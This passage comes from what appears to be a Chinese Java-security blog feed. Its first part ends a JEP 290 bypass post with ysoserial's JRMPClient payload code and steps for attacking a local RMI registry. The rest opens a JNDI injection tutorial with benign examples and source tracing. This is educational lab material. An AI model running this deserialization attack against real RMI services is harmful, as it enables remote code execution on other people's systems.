class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">package ysoserial.payloads;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.rmi.server.ObjID;</span><br><span class="line">import java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line">import java.util.Random;</span><br><span class="line"></span><br><span class="line">import sun.rmi.server.UnicastRef;</span><br><span class="line">import sun.rmi.transport.LiveRef;</span><br><span class="line">import sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line">import ysoserial.payloads.annotation.Authors;</span><br><span class="line">import ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line">import ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"></span><br><span class="line">@SuppressWarnings ( &#123;</span><br><span class="line">    &quot;restriction&quot;</span><br><span class="line">&#125; )</span><br><span class="line">@PayloadTest( harness=&quot;ysoserial.test.payloads.JRMPReverseConnectSMTest&quot;)</span><br><span class="line">@Authors(&#123; Authors.MBECHLER &#125;)</span><br><span class="line">public class JRMPClient extends PayloadRunner implements ObjectPayload&lt;Registry&gt; &#123;</span><br><span class="line"></span><br><span class="line">    public Registry getObject ( final String command ) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        String host;</span><br><span class="line">        int port;</span><br><span class="line">        int sep = command.indexOf(&#x27;:&#x27;);</span><br><span class="line">        if ( sep &lt; 0 ) &#123;</span><br><span class="line">            port = new Random().nextInt(65535);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            host = command.substring(0, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + 1));</span><br><span class="line">        &#125;</span><br><span class="line">        ObjID id = new ObjID(new Random().nextInt()); // RMI registry</span><br><span class="line">        TCPEndpoint te = new TCPEndpoint(host, port);</span><br><span class="line">        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));</span><br><span class="line">        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);</span><br><span class="line">        Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] &#123;</span><br><span class="line">            Registry.class</span><br><span class="line">        &#125;, obj);</span><br><span class="line">        return proxy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static void main ( final String[] args ) throws Exception &#123;</span><br><span class="line">        JRMPClient jrmpClient = new JRMPClient();</span><br><span class="line">        // exploit/JRMPListener 开启监听的端口是 7777  </span><br><span class="line">        Registry proxy = jrmpClient.getObject(&quot;127.0.0.1:7777&quot;);</span><br><span class="line">        Registry reg = LocateRegistry.getRegistry(&quot;localhost&quot;,1099);</span><br><span class="line">        reg.rebind(&quot;hello&quot;, proxy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行 Registry 端，运行 exploit&#x2F;JRMPListener ，最后运行 payloads&#x2F;JRMPClient ，就可以完成对 Registry 端的攻击。</p><p>会一直弹出计算器，是因为 Registry 端不断地在向 exploit&#x2F;JRMPListener 发起 DGC 调用请求，不断地收到异常类：</p><img src="/images/image-20240908165326049.png"><p>不过值得注意的是，上面的代码在更高一点的版本比如 8u392 就运行不成功，看来是过滤的更严格了：</p><img src="/images/image-20240908165724980.png"><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://drun1baby.top/2023/04/18/%E6%B5%85%E8%B0%88-JEP290/#0x02-%E5%85%B3%E4%BA%8E-JEP290">浅谈 JEP290</a></p><p><a href="https://su18.org/post/rmi-attack/#jep-290">Java RMI 攻击由浅入深</a></p><p><a href="https://m0d9.me/2020/07/02/RMI%EF%BC%9A%E7%BB%95%E8%BF%87JEP290%E2%80%94%E2%80%94%E4%B8%8A/">RMI：绕过 JEP290 —— 上</a></p><p><a href="https://m0d9.me/2020/07/11/RMI%EF%BC%9A%E7%BB%95%E8%BF%87JEP290%E2%80%94%E2%80%94%E4%B8%AD/">RMI：绕过 JEP290 —— 中</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;JEP-290&quot;&gt;&lt;a href=&quot;#JEP-290&quot; class=&quot;headerlink&quot; title=&quot;JEP 290&quot;&gt;&lt;/a&gt;JEP 290&lt;/h2&gt;&lt;p&gt;JEP290 是 Java 底层为了缓解反序列化攻击提出的一种解决方案。这是一个针对 JAVA 9 </summary>
      
    
    
    
    <category term="Java 安全" scheme="https://changeyourway.github.io/categories/Java-%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>漏洞篇 - JNDI 注入详解</title>
    <link href="https://changeyourway.github.io/2024/09/06/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-JNDI%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/"/>
    <id>https://changeyourway.github.io/2024/09/06/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-JNDI%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/</id>
    <published>2024-09-06T07:52:13.151Z</published>
    <updated>2024-09-06T07:54:24.724Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JNDI-基础"><a href="#JNDI-基础" class="headerlink" title="JNDI 基础"></a>JNDI 基础</h2><p>JNDI 全称为 <strong>Java Naming and Directory Interface</strong>，即 Java 名称与目录接口。JNDI 提供了一种统一的接口来访问不同的命名和目录服务。它被广泛应用于企业级 Java 应用程序中，用于查找和访问各种资源，如数据库连接、EJB（Enterprise JavaBeans）组件、消息队列、环境变量等。</p><p>那么提到命名和目录服务，就有一些名词需要了解一下。</p><h4 id="命名服务（Naming-Service）"><a href="#命名服务（Naming-Service）" class="headerlink" title="命名服务（Naming Service）"></a>命名服务（Naming Service）</h4><p>所谓命名服务，就是通过名称查找实际对象的服务。比如：</p><ul><li>DNS：通过域名查找实际的 IP 地址；</li><li>文件系统：通过文件名定位到具体的文件；</li></ul><p>在命名服务中有一些重要的概念：</p><ul><li><strong>Bindings</strong>：表示一个名称和对应对象的绑定关系。</li><li><strong>Context</strong>：上下文，它是一个容器，代表了一个命名空间或环境，用户可以在其中查找、绑定和管理名字与对象之间的关联。</li><li><strong>References</strong>：引用，它用于表示某个名字所对应的对象的“指针”或“引用路径”。通过引用，命名服务能够提供对对象的间接访问，而不是直接返回对象本身。</li></ul><h4 id="目录服务（Directory-Service）"><a href="#目录服务（Directory-Service）" class="headerlink" title="目录服务（Directory Service）"></a>目录服务（Directory Service）</h4><p>目录服务（Directory Service）是一个扩展了命名服务功能的服务，它不仅能够将名字映射到对象，还能为这些对象提供与之关联的属性（Attributes）。目录服务在管理和查找分布式资源时非常有用，特别是在企业级应用中。</p><h6 id="JNDI-中的目录服务实现"><a href="#JNDI-中的目录服务实现" class="headerlink" title="JNDI 中的目录服务实现"></a>JNDI 中的目录服务实现</h6><p>JNDI 本身只是一个 API ，具体的目录服务由底层的实现提供。常见的 JNDI 目录服务实现包括：</p><ul><li>LDAP (Lightweight Directory Access Protocol)：轻量级目录访问协议，最常用的目录服务协议，广泛用于企业中的用户和权限管理。</li><li>DNS (Domain Name System)：尽管主要是一个命名服务，DNS 也可以作为目录服务的一部分来处理一些资源记录。</li><li>NIS (Network Information Service)：主要用于 Unix&#x2F;Linux 系统中的网络信息管理。</li><li>RMI 注册表 (RMI Registry)：在 Java RMI 中，JNDI 可以与 RMI 注册表集成，提供分布式对象的目录服务。</li></ul><h4 id="JNDI-API-和-SPI"><a href="#JNDI-API-和-SPI" class="headerlink" title="JNDI API 和 SPI"></a>JNDI API 和 SPI</h4><p>JNDI（Java Naming and Directory Interface）包含两个主要部分：API（应用程序接口）和SPI（服务提供者接口）。如图：</p><img src="/images/1724813922373.png"><p>这两个部分分别定义了如何使用 JNDI 以及如何实现 JNDI 服务。</p><h6 id="JNDI-API"><a href="#JNDI-API" class="headerlink" title="JNDI API"></a>JNDI API</h6><p>JNDI API (Application Programming Interface) 是面向应用程序开发者的接口，提供了一组标准的方法和类，使开发者能够通过统一的方式访问不同的命名和目录服务。它隐藏了底层服务的具体实现，提供了一种抽象层，使得开发者无需关心具体的服务提供者如何实现这些功能。</p><p>JNDI API 提供了以下主要功能：</p><ul><li>命名操作：允许查找、绑定、重新绑定和取消绑定对象。基本操作包括：<ul><li><code>Context.lookup(String name)</code>：查找一个对象。</li><li><code>Context.bind(String name, Object obj)</code>：将一个名字绑定到一个对象。</li><li><code>Context.rebind(String name, Object obj)</code>：重新绑定一个名字到一个新对象。</li><li><code>Context.unbind(String name)</code>：从命名空间中解除名字与对象的绑定。</li></ul></li><li>目录操作：允许在对象中添加、删除、修改属性，以及查询对象的属性。主要操作包括：<ul><li><code>DirContext.getAttributes(String name)</code>：获取对象的属性。</li><li><code>DirContext.modifyAttributes(String name, int mod_op, Attributes attrs)</code>：修改对象的属性。</li><li><code>DirContext.search(String name, String filter, SearchControls cons)</code>：根据过滤条件搜索对象。</li></ul></li></ul><p>以下是一个简单的 JNDI API 使用示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// 创建JNDI环境</span><br><span class="line">Hashtable&lt;String, String&gt; env = new Hashtable&lt;&gt;();</span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.ldap.LdapCtxFactory&quot;);</span><br><span class="line">env.put(Context.PROVIDER_URL, &quot;ldap://localhost:389&quot;);</span><br><span class="line"></span><br><span class="line">// 获取初始上下文</span><br><span class="line">Context ctx = new InitialContext(env);</span><br><span class="line"></span><br><span class="line">// 查找对象</span><br><span class="line">Object obj = ctx.lookup(&quot;cn=example,dc=example,dc=com&quot;);</span><br><span class="line">System.out.println(&quot;Found object: &quot; + obj);</span><br><span class="line"></span><br><span class="line">// 关闭上下文</span><br><span class="line">ctx.close();</span><br></pre></td></tr></table></figure><h6 id="JNDI-SPI"><a href="#JNDI-SPI" class="headerlink" title="JNDI SPI"></a>JNDI SPI</h6><p>JNDI SPI (Service Provider Interface) 是面向服务提供者的接口，定义了如何实现 JNDI API 的底层功能。服务提供者需要实现这些接口，以便 JNDI API 能够与实际的命名和目录服务进行交互。</p><p>JNDI SPI 定义了各种底层操作的实现方式，服务提供者需要提供这些操作的具体实现。主要包括：</p><ul><li><strong>命名服务提供者接口</strong>：服务提供者需要实现 <code>javax.naming.spi.NamingManager</code> 类和相关接口，提供命名操作的具体实现。</li><li><strong>目录服务提供者接口</strong>：服务提供者需要实现 <code>javax.naming.spi.DirContext</code> 及其子类，提供目录操作的实现。</li></ul><p>用途：</p><ul><li><strong>服务集成</strong>：SPI 允许不同的命名和目录服务集成到 JNDI 中，使得 JNDI 能够支持多种服务（如 LDAP 、DNS 、RMI 等）。通过实现 SPI ，服务提供者可以将特定的命名和目录服务功能暴露给 JNDI API 。</li><li><strong>扩展性</strong>：通过 SPI ，JNDI 框架能够扩展，以支持新的命名和目录服务，而不需要修改 JNDI API 。</li></ul><p>以下是一个简单的 SPI 实现示例： 假设我们要实现一个简单的命名服务提供者，需要实现 <code>javax.naming.spi.InitialContextFactory</code> 接口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public class MyInitialContextFactory implements InitialContextFactory &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Context getInitialContext(Hashtable&lt;?, ?&gt; environment) throws NamingException &#123;</span><br><span class="line">        return new MyContext(environment);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 自定义的Context实现</span><br><span class="line">class MyContext implements Context &#123;</span><br><span class="line">    private Hashtable&lt;?, ?&gt; environment;</span><br><span class="line"></span><br><span class="line">    public MyContext(Hashtable&lt;?, ?&gt; environment) &#123;</span><br><span class="line">        this.environment = environment;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Object lookup(String name) throws NamingException &#123;</span><br><span class="line">        // 自定义查找逻辑</span><br><span class="line">        return &quot;Looked up object for &quot; + name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 其他Context接口方法的实现...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="JNDI-API-和-SPI-的关系"><a href="#JNDI-API-和-SPI-的关系" class="headerlink" title="JNDI API 和 SPI 的关系"></a>JNDI API 和 SPI 的关系</h6><ul><li><strong>API 使用 SPI</strong>：JNDI API 提供了应用程序访问命名和目录服务的方法，但这些方法的具体实现依赖于底层的 SPI 。SPI 由具体的服务提供者实现，并通过 API 暴露给应用程序。</li><li><strong>分离实现与使用</strong>：API 和 SPI 的分离设计使得 JNDI 具有高度的灵活性和可扩展性。应用程序可以使用统一的 API 与不同的服务交互，而不同的服务提供者可以通过实现 SPI 集成到 JNDI 框架中。</li></ul><p><strong>总结</strong></p><ul><li>JNDI API 是开发者与命名和目录服务交互的入口，提供了高层次的抽象接口。</li><li>JNDI SPI 则是底层服务提供者实现 API 所需功能的接口，确保 JNDI 能够支持多种不同的命名和目录服务。</li></ul><h2 id="JNDI-入门案例"><a href="#JNDI-入门案例" class="headerlink" title="JNDI 入门案例"></a>JNDI 入门案例</h2><p>那么首先来实现一个利用 JNDI 接口调用 RMI 的入门案例。</p><p>RMI 服务端：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line">import java.rmi.AlreadyBoundException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class Server &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException, AlreadyBoundException, InterruptedException &#123;</span><br><span class="line">        // 将 SayHello 服务转换为 RMI 远程服务接口</span><br><span class="line">        SayHelloInterface skeleton = new SayHelloImpl();</span><br><span class="line">        // 将 RMI 服务注册到 1099 端口</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">        // 注册 SayHello 服务，服务名为 &quot;SayHello&quot;</span><br><span class="line">        registry.rebind(&quot;SayHello&quot;, skeleton);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接口 SayHelloInterface ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public interface SayHelloInterface extends Remote &#123;</span><br><span class="line">    String function(String input) throws IOException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line">public class SayHelloImpl extends UnicastRemoteObject implements SayHelloInterface  &#123;</span><br><span class="line">    protected SayHelloImpl() throws RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String function(String input) throws RemoteException, IOException &#123;</span><br><span class="line">        return input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JNDI 客户端：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.InitialContext;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line"></span><br><span class="line">public class Client &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        //设置JNDI环境变量</span><br><span class="line">        Hashtable&lt;String, String&gt; env = new Hashtable&lt;&gt;();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);</span><br><span class="line">        env.put(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;);</span><br><span class="line">        //初始化上下文</span><br><span class="line">        Context initialContext = new InitialContext(env);</span><br><span class="line">        //调用远程类</span><br><span class="line">        SayHelloInterface sayhello = (SayHelloInterface) initialContext.lookup(&quot;SayHello&quot;);</span><br><span class="line">        System.out.println(sayhello.function(&quot;test&quot;));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><img src="/images/QQ_1725023949201.png"><p>那么从上面的案例可以看出，要想使用 JNDI 接口调用 RMI ，只需要把原来的 Registry 对象换成 JNDI 的 Context 上下文对象即可，利用这个上下文对象来统一调度各种命名与目录服务。</p><p>前面在举 JNDI API 使用示例的时候，调用的是 LDAP 服务，可以看到也是先获取了 Context 上下文对象。</p><p>那么 Context 上下文对象是如何判断具体调用哪一种服务的呢？</p><p>在获取 Context 对象时调用了 InitialContext 构造方法，传入了一个 Hashtable 对象，在这个对象中设置了两个键，分别是 INITIAL_CONTEXT_FACTORY 和 PROVIDER_URL ，它们就分别代表了要调用的服务和服务器的地址。</p><h2 id="JNDI-源码分析"><a href="#JNDI-源码分析" class="headerlink" title="JNDI 源码分析"></a>JNDI 源码分析</h2><p>环境为 JDK 8u71 。</p><h4 id="初始化上下文"><a href="#初始化上下文" class="headerlink" title="初始化上下文"></a>初始化上下文</h4><p>在 new InitialContext 处下断点：</p><img src="/images/QQ_1725025107716.png"><p>跟进 InitialContext 的构造方法一探究竟：</p><img src="/images/QQ_1725025185797.png"><p>这里首先是调用 environment.clone() ，Hashtable 类的 clone 方法用于创建一个 Hashtable 对象的浅拷贝。浅拷贝意味着它会引用原始 Hashtable 中的键值对，但不会复制这些键值对本身所引用的对象。也就是说新拷贝的 Hashtable 将包含与原始 Hashtable 相同的键和相同的值的引用，但这些值是与原 Hashtable 中的相同对象共享的。</p><p>然后调用了 InitialContext 的 init 方法，跟进它：</p><img src="/images/QQ_1725025394196.png"><p>这里先是调用 ResourceManager.getInitialEnvironment 方法。</p><h6 id="ResourceManager-getInitialEnvironment"><a href="#ResourceManager-getInitialEnvironment" class="headerlink" title="ResourceManager#getInitialEnvironment"></a>ResourceManager#getInitialEnvironment</h6><p>这个方法通过合并多种来源（包括用户提供的环境设置、系统属性、Applet 参数和应用资源文件）来构建最终的环境 Hashtable 。</p><p>跟进 ResourceManager.getInitialEnvironment 方法看看：</p><img src="/images/QQ_1725075439737.png"><p>首先是创建了一个 props 数组，这个数组中包含了很多与命名服务相关的属性：</p><img src="/images/QQ_1725075493848.png"><p>然后判断 env 是否存在，没有就创建。因为我们传入了一个 env 对象，所以不创建。</p><p>接着从 env 中获取 Context.APPLET 键的值，因为我们一开始并没有设置，自然获取到空值：</p><img src="/images/QQ_1725075668483.png"><p>再往下看：</p><img src="/images/QQ_1725075703930.png"><p>这里首先是利用 helper.getJndiProperties 从系统属性中获取与 JNDI 相关的属性值，但是我并没有设置系统属性，所以获取到空值：</p><img src="/images/QQ_1725077490189.png"><img src="/images/QQ_1725076041307.png"><p>接下也是最为关键的一步，循环遍历，将 props 数组中的所有值作为键去获取对应的值。首先是从 env 中找，如果 env 没有就再去 applet 中找，如果还是没有就再去 jndiSysProps 中找。所以这里就找了传入的值、Applet 参数和系统属性，将找到的结果全部注入到 env 中。</p><p>方法的最后就是判断有没有开启应用资源文件，如果允许的话，就再从应用资源文件中找一遍。如果不允许，就直接返回 env ：</p><img src="/images/QQ_1725076491813.png"><p>因为我只设置了 env ，所以最后返回的结果跟传入的参数一模一样：</p><img src="/images/QQ_1725076806822.png"><h6 id="设置系统属性来初始化上下文"><a href="#设置系统属性来初始化上下文" class="headerlink" title="设置系统属性来初始化上下文"></a>设置系统属性来初始化上下文</h6><p>由此也可以知道，除了设置 Hashtable 对象外，还可以通过设置系统属性来初始化上下文。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class Client &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">// 设置系统属性</span><br><span class="line">        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);</span><br><span class="line">        System.setProperty(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;);</span><br><span class="line">// 初始化上下文</span><br><span class="line">        Context initialContext = new InitialContext();</span><br><span class="line">        //调用远程类</span><br><span class="line">        SayHelloInterface sayhello = (SayHelloInterface) initialContext.lookup(&quot;SayHello&quot;);</span><br><span class="line">        System.out.println(sayhello.function(&quot;test&quot;));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样在调用 helper.getJndiProperties 获取系统属性时获取到的将不再是空值：</p><img src="/images/QQ_1725077562018.png"><p>那么 ResourceManager.getInitialEnvironment 就分析完了。</p><p>回到 init 方法，我们继续看 getDefaultInitCtx 方法：</p><img src="/images/{842EB5FD-7EDE-4D50-86CB-882140458A4C}"><h6 id="InitialContext-getDefaultInitCtx"><a href="#InitialContext-getDefaultInitCtx" class="headerlink" title="InitialContext#getDefaultInitCtx"></a>InitialContext#getDefaultInitCtx</h6><p>跟进 InitialContext#getDefaultInitCtx 看看：</p><img src="/images/QQ_1725083853814.png"><h6 id="NamingManager-getInitialContext"><a href="#NamingManager-getInitialContext" class="headerlink" title="NamingManager#getInitialContext"></a>NamingManager#getInitialContext</h6><p>这里只是调用了 NamingManager.getInitialContext ，跟进它：</p><img src="/images/image-20240831140627510.png"><p>NamingManager.getInitialContext 首先调用了 getInitialContextFactoryBuilder 获取了一个 InitialContextFactoryBuilder 对象。</p><img src="/images/QQ_1725084482734.png"><p>这个方法没什么可看的，最后获取到的 builder 为空：</p><img src="/images/QQ_1725084515607.png"><p>进入 builder 为空的判断，随后获取了 env 中的 Context.INITIAL_CONTEXT_FACTORY 属性值，也就是我们一开始设置的那个属性值：</p><img src="/images/QQ_1725084638437.png"><p>显然不为空，那么不会报出异常。</p><p>继续往下：</p><img src="/images/QQ_1725084720549.png"><p>先是实例化了一下 RegistryContextFactory 类：</p><img src="/images/QQ_1725085639878.png"><p>正确传入了 className 那么实例化没有问题。</p><p>builder 为空，所以 builder.createInitialContextFactory 不会被调用。</p><p>最后调用 factory.getInitialContext 方法，也就是 RegistryContextFactory 的 getInitialContext 方法。</p><h6 id="RegistryContextFactory-getInitialContext"><a href="#RegistryContextFactory-getInitialContext" class="headerlink" title="RegistryContextFactory#getInitialContext"></a>RegistryContextFactory#getInitialContext</h6><p>跟进 RegistryContextFactory 的 getInitialContext 方法：</p><img src="/images/QQ_1725085874130.png"><p>var1 是传入的 Hashtable 对象 env ，自然是不为空的。这里创建 var1 的引用。</p><p>先调用 getInitCtxURL 方法获取了环境变量中的 java.naming.provider.url 属性，也即 “rmi:&#x2F;&#x2F;localhost:1099” 字符串返回：</p><img src="/images/QQ_1725086036739.png"><p>然后调用 URLToContext 方法将参数传入，跟进 RegistryContextFactory 的 URLToContext 方法：</p><img src="/images/QQ_1725086448932.png"><p>这里的核心是利用 rmiURLContextFactory 的构造方法获取一个 rmiURLContextFactory 对象，利用这个工厂对象获取 Context 对象并返回。</p><p>rmiURLContextFactory 构造方法什么也没写：</p><img src="/images/QQ_1725086841824.png"><p>那就接着看 rmiURLContextFactory 的 getObjectInstance 方法：</p><img src="/images/QQ_1725086970746.png"><p>var1 是有值的，而且是 String 类型，所以调用 getUsingURL 处理。</p><p>跟进 rmiURLContextFactory 的 getUsingURL 方法：</p><img src="/images/QQ_1725087125013.png"><p>这里获取到的 var2 是 rmiURLContext 对象，其中依然封装着环境变量：</p><img src="/images/QQ_1725087363188.png"><p>接下来便会调用 rmiURLContext 的父类 GenericURLContext 的 lookup 方法。</p><h6 id="GenericURLContext-lookup"><a href="#GenericURLContext-lookup" class="headerlink" title="GenericURLContext#lookup"></a>GenericURLContext#lookup</h6><p>跟进 GenericURLContext 的 lookup 方法：</p><img src="/images/QQ_1725087523333.png"><p>跟进 GenericURLContext 的 getRootURLContext 方法：</p><p>GenericURLContext 的 getRootURLContext 方法做了大量的字符串处理，在方法的最后调用了 RegistryContext 的构造方法：</p><img src="/images/QQ_1725088276107.png"><p>来看 RegistryContext 的构造方法：</p><img src="/images/QQ_1725088849863.png"><p>最后调用 RegistryContext 的 getRegistry 方法获取了一个 RegistryImpl_Stub 对象：</p><img src="/images/QQ_1725089041622.png"><p>RegistryContext 的 getRegistry 方法毫不意外是用 LocateRegistry.getRegistry 方法获取对象，与 RMI 一样：</p><img src="/images/QQ_1725089107722.png"><p>好，那么回到 GenericURLContext 的 lookup 方法，此时 getRootURLContext 已经调用完毕，获取到的 var2 有两个属性 resolvedObj 和 remainingName：</p><img src="/images/QQ_1725089500131.png"><p>那么 var3 获取到的自然是 RegistryContext 对象，调用 RegistryContext 的 lookup 方法。</p><p>RegistryContext 的 lookup 方法：</p><img src="/images/QQ_1725089711617.png"><p>也是毫不意外地调用了 this.registry.lookup 方法，也即 RegistryImpl_Stub 的 lookup 方法。</p><p>至于这里为什么要调用 lookup 方法，是这样的：getRootURLContext 方法的返回值不是有两个属性嘛，一个 resolvedObj ，一个 remainingName ：</p><img src="/images/QQ_1725103006128.png"><p>resolvedObj 代表的含义就是已解析的对象（即部分路径对应的上下文对象），而 remainingName 表示尚未解析的路径部分，那么这里调用 lookup 方法就是为了完成对剩余路径部分的解析，利用已经获取的上下文对象 RegistryImpl_Stub 来获取剩余路径所指代的对象。就好比说先获取 DNS 的顶级域名，再从顶级域名中获取二级域名嘛。</p><p>JNDI 的命名系统通常是分层次的，每层可能由不同的命名上下文负责。例如，在一个典型的 URL 路径中，前面的一部分路径可能已经解析到一个特定的上下文对象，但后面的一部分路径仍需要进一步解析。</p><p>至此，我们就完成了对上下文对象的初始化，获取到了 Context 对象。</p><h6 id="调用链总结"><a href="#调用链总结" class="headerlink" title="调用链总结"></a>调用链总结</h6><p>以调用 RMI 服务为例，总结一下调用链，用 -&gt; 表示同一个方法中的不同分支：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">InitialContext#InitialContext(Hashtable&lt;?,?&gt;)</span><br><span class="line">InitialContext#init(Hashtable&lt;?,?&gt;)</span><br><span class="line">-&gt; ResourceManager#getInitialEnvironment(Hashtable&lt;?, ?&gt;) # 获取环境变量</span><br><span class="line">-&gt; InitialContext#getDefaultInitCtx()</span><br><span class="line">   NamingManager#getInitialContext(Hashtable&lt;?,?&gt;)</span><br><span class="line">   RegistryContextFactory#getInitialContext(Hashtable&lt;?, ?&gt;)</span><br><span class="line">   